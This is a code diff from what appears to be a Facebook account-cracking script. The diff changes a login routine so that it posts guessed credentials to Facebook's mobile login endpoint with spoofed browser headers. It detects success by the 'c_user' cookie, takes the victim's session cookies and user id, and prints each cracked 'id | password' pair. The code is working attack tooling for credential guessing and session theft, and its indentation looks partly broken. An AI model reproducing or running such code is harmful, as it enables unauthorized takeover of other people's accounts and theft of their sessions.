@@ -105,7 +105,13 @@ def rndm(ids,mking_pass):
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}
-			if 'session_key' in po:
+			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
 				uid = po['uid']
 				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
 				print('\r\r\033[1;32m [Saadat-OK] '+str(uid)+' | '+pas+'\033[1;97m')
